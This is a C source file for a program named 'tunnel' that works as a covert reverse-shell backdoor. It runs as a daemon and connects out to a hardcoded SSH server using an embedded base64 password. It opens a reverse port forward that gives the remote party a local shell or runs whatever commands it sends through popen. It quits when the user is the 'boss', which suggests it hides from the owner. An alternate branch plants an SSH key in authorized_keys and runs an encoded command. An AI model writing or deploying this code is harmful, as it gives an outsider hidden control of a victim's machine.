/***************************************************************************
 * Copyright (C) 2017 - 2020, Lanka Hsu, <lankahsu@gmail.com>, et al.
 *
 * This software is licensed as described in the file COPYING, which
 * you should have received as part of this distribution.
 *
 * You may opt to use, copy, modify, merge, publish, distribute and/or sell
 * copies of the Software, and permit persons to whom the Software is
 * furnished to do so, under the terms of the COPYING file.
 *
 * This software is distributed on an "AS IS" basis, WITHOUT WARRANTY OF ANY
 * KIND, either express or implied.
 *
 ***************************************************************************/
#include <signal.h>
#include <getopt.h>

#include "utilx9.h"
#include <sys/sysinfo.h>
#include <libssh/libssh.h>

#define TAG "tunnel"

static int is_quit = 0;

char filename[LEN_OF_FULLNAME] = "";
char whoami[LEN_OF_USER] = "";
char hostname[LEN_OF_HOSTNAME] = "";

//#define BUILD_DEBUG
#ifdef BUILD_DEBUG
#define MY_BOSS "1111"
#else
#define MY_BOSS "lanka"
#endif

#define USE_LIBSSH

#ifdef USE_LIBSSH
#define OPEN_START_PORT 19999

Tunnel_t tunnel_req =
{
	.ssh_req.server_ip = "192.168.50.100",
	.ssh_req.server_port = 2222,
//	.ssh_req.server_port = 22,
	.ssh_req.server_user = "pikachu",
	.ssh_req.server_pass_enc = "Njk2NDEyNzY=",
	.ssh_req.session = NULL,
	.ssh_req.channel = NULL,
	.ssh_req.verbosity = 0,

	.mode = TUNNEL_MODE_ID_SSH_FAKE,
	.open_port = OPEN_START_PORT,

	.timeout = 10*1000,
	.foreground = 0,

	.retry = 10,
	.isquit = 0,
};

SSH_t ssh_local =
{
	.server_ip = "127.0.0.1",
	//.server_port = 2222, //22,
	//.server_user = "lanka",
	//.server_pass_enc = "Njk2NDEyNzY=",
	.session = NULL,
	.channel = NULL,

	.cols = 80,
	.rows = 24,
	.verbosity = 0,
};

static void tunnel_stop(Tunnel_t *tunnel_req)
{
	tunnel_req->isquit = 1;
}

static int tunnel_is_quit(Tunnel_t *tunnel_req)
{
	return tunnel_req->isquit || (!tunnel_req->retry);
}

static void tunnel_close(Tunnel_t *tunnel_req)
{
	sshX_close_channel(&tunnel_req->ssh_req);
	sshX_close_session(&tunnel_req->ssh_req);
}

void tunnel_ssh_response(ChainX_t *chainX_req, char *buff, int buff_len)
{
	//DBG_IF_LN("Got !!! (buff: %s)", buff);
	ssh_channel_write(tunnel_req.ssh_req.channel, buff, buff_len);
}

static void tunnel_loop_ssh(Tunnel_t *tunnel_req)
{
	ChainX_t chainX_S =
	{
		.mode = CHAINX_MODE_ID_TCP_CLIENT,
		.sockfd = -1,

		.status = 0,
		.isfree = 0,

		.security = 0,
		.noblock = 1,

		.retry_hold = TIMEOUT_OF_RETRY_HOLD,
		.select_wait = TIMEOUT_OF_SELECT_1,
		.c_data = NULL,
	};

	ChainX_t *chainX_req = &chainX_S;

	chainX_ip_set(chainX_req, "127.0.0.1");
	chainX_port_set(chainX_req, 22);
	chainX_security_set(chainX_req, 0);

	chainX_pipe_register(chainX_req, tunnel_ssh_response);

	chainX_thread_init(chainX_req);

	ssh_session session = tunnel_req->ssh_req.session;
	ssh_channel channel = tunnel_req->ssh_req.channel;
	while ((ssh_channel_is_closed(channel) == 0) && (ssh_channel_is_eof(channel) == 0))
	{
		char buffer[LEN_OF_BUF1024];
		memset(buffer, 0, sizeof(buffer));
		int nbytes = ssh_channel_read(channel, buffer, sizeof(buffer), 0);
		if (nbytes < 0)
		{
			DBG_ER_LN("ssh_channel_read error !!! (%d %s)", ssh_get_error_code(session), ssh_get_error(session));
			goto exit_channel;
		}

		if (chainX_linked_check(chainX_req) == 0)
		{
			int left_len = nbytes; // end : "\0"
			char *send_ptr = buffer;
			while (left_len)
			{
				int result = SOCKETX_WRITE(chainX_req, send_ptr, left_len);
				//DBG_ER_LN("(result: %d, left_len: %d)", result, left_len);
				if (result == -1)
				{
					if (errno == EAGAIN)
					{
						usleep(1000);
						// try again;
					}
					else
					{
						goto exit_channel;
					}
				}
				else
				{
					send_ptr += result;
					left_len -= result;
				}
			}
		}
		else
		{
			goto exit_channel;
		}
	}

exit_channel:
	chainX_thread_stop(chainX_req);
	chainX_thread_close(chainX_req);

	sshX_close_channel(&tunnel_req->ssh_req);
}

static void tunnel_loop_ssh_fake(Tunnel_t *tunnel_req)
{
	SSH_t *ssh_req_frm = &tunnel_req->ssh_req;
	SSH_t *ssh_req = &ssh_local;

	if (sshX_client(ssh_req) == NULL)
	{
		DBG_ER_LN("ssh_new error !!!");
		return ;
	}

	if (sshX_open_channel(ssh_req))
	{
		sshX_open_shell(ssh_req);
		sshX_request_pty(ssh_req);
		sshX_request_shell(ssh_req);

		sshX_select_loop_with_tunnel(ssh_req, ssh_req_frm);
	}

	sshX_close_channel(ssh_req);
	sshX_close_session(ssh_req);
}

static void tunnel_prompt(Tunnel_t *tunnel_req)
{
	ssh_channel channel = tunnel_req->ssh_req.channel;

	char cwd[PATH_MAX] = "";
	getcwd(cwd, sizeof(cwd));

	memset(tunnel_req->ssh_req.prompt, 0, sizeof(tunnel_req->ssh_req.prompt));
	SAFE_SNPRINTF(tunnel_req->ssh_req.prompt, sizeof(tunnel_req->ssh_req.prompt), "%s@%s:%d:%s$ ", whoami, hostname, tunnel_req->open_port, cwd);
	ssh_channel_write(channel, tunnel_req->ssh_req.prompt, sizeof(tunnel_req->ssh_req.prompt));
}

static void tunnel_loop_popen(Tunnel_t *tunnel_req)
{
	ssh_session session = tunnel_req->ssh_req.session;
	ssh_channel channel = tunnel_req->ssh_req.channel;

	while ((ssh_channel_is_closed(channel) == 0) && (ssh_channel_is_eof(channel) == 0))
	{
		tunnel_prompt(tunnel_req);

		char buffer[LEN_OF_BUF1024];
		memset(buffer, 0, sizeof(buffer));
		int nbytes = ssh_channel_read(channel, buffer, sizeof(buffer), 0);
		if (nbytes < 0)
		{
			DBG_ER_LN("ssh_channel_read error !!! (%d %s)", ssh_get_error_code(session), ssh_get_error(session));
			goto exit_channel;
		}

		DBG_DB_LN("%s", buffer);
		{
			FILE *fd = SAFE_POPEN(buffer, "r");
			if (fd)
			{
				char newline[LEN_OF_NEWLINE] = "";
				while (SAFE_FGETS(newline, sizeof(newline), fd)!= NULL)
				{
					nbytes = ssh_channel_write(channel, newline, sizeof(newline));
					memset(newline, 0, sizeof(newline));
				}
				SAFE_PCLOSE(fd);
			}
		}

	}

exit_channel:
	sshX_close_channel(&tunnel_req->ssh_req);
}

static void tunnel_listen(Tunnel_t *tunnel_req)
{
	int rc = SSH_AGAIN;
	ssh_session session = tunnel_req->ssh_req.session;

	// listen
	while ((tunnel_req->retry > 0) && (rc!=SSH_OK))
	{
		DBG_DB_LN("call ssh_channel_listen_forward ... (open_port: %d, retry: %d)", tunnel_req->open_port, tunnel_req->retry);
		int bound_port = 0;
		rc = ssh_channel_listen_forward(session, NULL, tunnel_req->open_port, &bound_port);
		if (rc == SSH_OK)
		{
			break;
		}
		else
		{
			DBG_ER_LN("ssh_channel_listen_forward error !!! (rc: %d, %d %s)", rc, ssh_get_error_code(session), ssh_get_error(session));
			tunnel_req->open_port --;
			sleep(3);
		}
		tunnel_req->retry --;
	}

	char *banner = ssh_get_issue_banner(session);
	if (banner)
	{
		DBG_DB_LN("(banner: %s)", banner);
		SAFE_FREE(banner);
	}

	//DBG_DB_LN("(rc: %d, isquit: %d)", rc, tunnel_req->isquit);
wait_channel:
	if ((rc==SSH_OK) && (tunnel_req->isquit == 0))
	{
		DBG_DB_LN("call ssh_channel_accept_forward ... (open_port: %d)", tunnel_req->open_port);
		int dport = 0;
		tunnel_req->ssh_req.channel = ssh_channel_accept_forward(session, tunnel_req->timeout, &dport);
		if ((tunnel_req->ssh_req.channel == NULL))
		{
			if ((ssh_get_error_code(session)==0))
			{
				goto wait_channel;
			}
			else
			{
				DBG_ER_LN("ssh_channel_accept_forward error !!! (%d %s)", ssh_get_error_code(session), ssh_get_error(session));
			}
		}
		else
		{
			DBG_DB_LN("a new channel !!! (dport: %d)", dport);

			switch (tunnel_req->mode)
			{
				case TUNNEL_MODE_ID_SSH:
					tunnel_loop_ssh(tunnel_req);
					tunnel_close(tunnel_req);
					break;
				case TUNNEL_MODE_ID_STDINOUT:
					tunnel_loop_popen(tunnel_req);
					break;
				case TUNNEL_MODE_ID_SSH_FAKE:
				default:
					tunnel_loop_ssh_fake(tunnel_req);
					break;
			}

			tunnel_close(tunnel_req);
		}
	}
}

static void tunnel_create(Tunnel_t *tunnel_req)
{
	ssh_init();
	SSH_t *ssh_req = &tunnel_req->ssh_req;

	DBG_TR_LN("call ssh_new ... (mode: %d)", tunnel_req->mode);
	if (sshX_client(ssh_req) == NULL)
	{
		DBG_ER_LN("ssh_new error !!!");
		return ;
	}

	tunnel_listen(tunnel_req);

	ssh_finalize();
}
#else
//#define FILE_AUTH_KEY "~/.ssh/authorized_keys"
#define SSH_PUB_KEY "ssh-rsa XXX"
#define SSH_TUNNEL_ENC "XXX"

static int ssh_auth_key = 0; // 1: found

int newline_lookupokup_cb(char *newline, void *arg)
{
	int ret = 0;
	if ((strcmp(newline, SSH_PUB_KEY) == 0))
	{
		DBG_DB_LN(DBG_TXT_FOUND);
		ssh_auth_key = 1;
	}
	return ret;
}

static void tunnel_create_system(void)
{
	char file_auth_key[LEN_OF_FULLNAME] = "";

	SAFE_SNPRINTF(file_auth_key, sizeof(file_auth_key), "%s/.ssh/authorized_keys", sys_homedir());
	DBG_DB_LN("(file_auth_key: %s)", file_auth_key);

	file_lookup(file_auth_key, newline_lookupokup_cb, NULL);
	if (ssh_auth_key==0)
	{
		file_append(file_auth_key, SSH_PUB_KEY, strlen(SSH_PUB_KEY));
	}

	{
		int ssh_tunnel_dec_len = 0;
		char *ssh_tunnel_dec = sec_base64_dec(SSH_TUNNEL_ENC, strlen(SSH_TUNNEL_ENC), &ssh_tunnel_dec_len);
		SAFE_SYSTEM(ssh_tunnel_dec);
		SAFE_FREE(ssh_tunnel_dec);
	}
}
#endif

void if_list_cb(char *ifa_name, int ifa_flags, int family, char *host, char *netmask)
{
	DBG_DB_LN("(family: %d, host: %s)", family, host);
}

static void app_instance(void)
{
	{
		// file
		SAFE_SNPRINTF(filename, sizeof(filename), "/tmp/%s", TAG);
		int myfd = open((char *)filename, O_CREAT | O_EXCL, 0666);
		if (myfd < 0)
		{
			DBG_DB_LN("Running !!! (%s)", filename);
			memset(filename, 0, sizeof(filename));
			exit(1);
		}
		SAFE_CLOSE(myfd);
	}

	{
		// whoami
		SAFE_SNPRINTF(whoami, sizeof(whoami), "%s", sys_username());
		DBG_DB_LN("(whoami: %s)", whoami);

		if (SAFE_STRCASESTR(whoami, MY_BOSS))
		{
			DBG_DB_LN("Bye-Bye Boss !!! (%s)", whoami);
			exit(1);
		}

		gethostname(hostname, sizeof(hostname));
	}

	{
		// ip
		chainX_if_list(if_list_cb);
	}
}

static void app_set_quit(int mode)
{
	is_quit = mode;
}

static int app_quit(void)
{
	return is_quit;
}

static void app_loop(void)
{
	DBG_TR_LN("enter");

	while (app_quit() == 0)
	{
#ifdef USE_LIBSSH
		tunnel_create(&tunnel_req);
		if ((tunnel_is_quit(&tunnel_req) == 1))
		{
			break;
		}
#else
		tunnel_create_system();
#endif
		sleep(2);
	}
}

static void app_stop(void)
{
	DBG_TR_LN("enter");
	if (app_quit()==0)
	{
		app_set_quit(1);

#ifdef USE_LIBSSH
		tunnel_stop(&tunnel_req);
#endif
	}
}

static void app_free(void)
{
	if ((strlen(filename) > 0))
	{
		unlink(filename);
	}
}

static void app_exit(void)
{
	DBG_TR_LN("enter");

	app_stop();

	app_free();
}

static void app_signal_handler(int signum)
{
	switch (signum)
	{
		case SIGINT:
		case SIGTERM:
		case SIGHUP:
			app_stop();
			break;
		case SIGPIPE:
		case SIGUSR1:
			break;
		case SIGUSR2:
			dbg_lvl_round();
			DBG_ER_LN("dbg_lvl_get(): %d", dbg_lvl_get());
			break;
	}
}

static void app_signal_register(void)
{
	signal(SIGINT, app_signal_handler);
	signal(SIGTERM, app_signal_handler);
	signal(SIGHUP, app_signal_handler);
	signal(SIGUSR1, app_signal_handler);
	signal(SIGUSR2, app_signal_handler);

	signal(SIGPIPE, SIG_IGN);
}

int option_index = 0;
const char* short_options = "i:p:u:s:o:m:fvh";
static struct option long_options[] =
{
	{ "ip",          required_argument,   NULL,    'i'  },
	{ "port",        required_argument,   NULL,    'p'  },
	{ "user",        required_argument,   NULL,    'u'  },
	{ "pass",        required_argument,   NULL,    's'  },
	{ "open",        required_argument,   NULL,    'o'  },
	{ "mode",        required_argument,   NULL,    'm'  },
	{ "foreground",  no_argument,         NULL,    'f'  },
	{ "verbose",     no_argument,         NULL,    'v'  },
	{ "help",        no_argument,         NULL,    'h'  },
	{ 0,             0,                      0,    0    }
};

static void app_showusage(int exit_code)
{
	printf("Usage: %s\n"
		"  -i, --ip          ip\n"
		"  -p, --port        port\n"
		"  -u, --user        user\n"
		"  -s, --pass        pass\n"
		"  -o, --open        open port\n"
		"  -m, --mode        mode\n"
		"  -f, --foreground\n"
		"  -v, --verbose\n"
		"  -h, --help\n", TAG);
	printf("Version: %s\n", version_show());
	printf("Example:\n"
		"  %s -i 192.168.50.100 -p 19999 -u admin -s hahahaha\n", TAG
	);
	exit(exit_code);
}

static void app_ParseArguments(int argc, char **argv)
{
	int opt;

	while ((opt = getopt_long(argc, argv, short_options, long_options, &option_index)) != -1)
	{
		switch (opt)
		{
			case 'i':
				if (optarg)
				{
					SAFE_SPRINTF(tunnel_req.ssh_req.server_ip, "%s", optarg);
				}
				break;
			case 'p':
				if (optarg)
				{
					tunnel_req.ssh_req.server_port = atoi(optarg);
				}
				break;
			case 'v':
				tunnel_req.ssh_req.verbosity = 1;
				break;
			case 'u':
				if (optarg)
				{
					SAFE_SPRINTF(tunnel_req.ssh_req.server_user, "%s", optarg);
				}
				break;
			case 's':
				if (optarg)
				{
					SAFE_SPRINTF(tunnel_req.ssh_req.server_pass_dec, "%s", optarg);
				}
				break;
			case 'o':
				if (optarg)
				{
					tunnel_req.open_port = atoi(optarg);
				}
				break;
			case 'm':
				if (optarg)
				{
					tunnel_req.mode = atoi(optarg);
				}
				break;
			case 'f':
				tunnel_req.foreground = 1;
				break;
			default:
				app_showusage(-1);
				break;
		}
	}
}

static void app_init(int argc, char **argv)
{
	app_signal_register();
	atexit(app_exit);

#ifdef BUILD_DEBUG
	dbg_lvl_set(DBG_LVL_TRACE);
#else
	dbg_lvl_set(DBG_LVL_INFO);
#endif

	app_instance();

	app_ParseArguments(argc, argv);

	if (strlen(tunnel_req.ssh_req.server_ip) <= 0)
	{
		app_showusage(-1);
	}
}

int main(int argc, char* argv[])
{
	app_init(argc, argv);

	if ((tunnel_req.foreground) || (daemon(0,1) == 0))
	{
		app_loop();
	}

	exit(0);
}
